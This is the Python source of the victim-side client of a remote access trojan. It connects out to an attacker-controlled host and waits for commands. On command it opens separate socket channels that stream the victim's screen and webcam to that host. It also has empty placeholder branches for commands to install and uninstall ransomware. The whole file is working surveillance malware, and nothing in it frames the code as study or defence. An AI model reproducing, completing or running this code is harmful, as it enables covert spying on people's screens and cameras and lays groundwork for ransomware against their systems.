import threading
from victim_constants import *
from constants import *
import socket
import ScreenSharing.sharer.sharer as scSharer
import WebCamSharing.sharer.sharer as wcSharer

soc = None

def connectToServer():
    print("Connecting to host...")

    global soc
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect((HOST_IP, HOST_PORT))
    
    soc.send(COMMANDS_CHANNEL.encode()) # Tell the server we want to use this socket connection as the commands channel

    print("Successfully connected!")

def getCommand():
    command = soc.recv(1024).decode()
    print(f"Recv command! : {command}")
    return command

def processCommand(command):
    if command == WATCH_SCREEN_COMMAND:
        threading.Thread(target= handleScreenSharing).start()
        
    elif command == WATCH_WEBCAM_COMMAND:
        threading.Thread(target= handleWebCameraSharing).start()

    elif command == INSTALL_RANSOMWARE_COMMAND:
        pass

    elif command == UNINSTALL_RANSOMWARE_COMMAND:
        pass


def handleScreenSharing():
    screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    screenShareSoc.connect((HOST_IP, HOST_PORT))

    screenShareSoc.send(SCREEN_SHARE_CHANNEL.encode()) # Tell the server we want to use this socket connection as the screenShare channel

    scSharer.shareScreen(screenShareSoc)

def handleWebCameraSharing():
    screenShareSoc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    screenShareSoc.connect((HOST_IP, HOST_PORT))

    screenShareSoc.send(WEB_CAM_SHARE_CHANNEL.encode()) # Tell the server we want to use this socket connection as the web camera sharing channel

    wcSharer.shareWebCam(screenShareSoc)

def main():
    connectToServer()

    while True:
        command = getCommand()
        processCommand(command)

if __name__ == "__main__":
    main()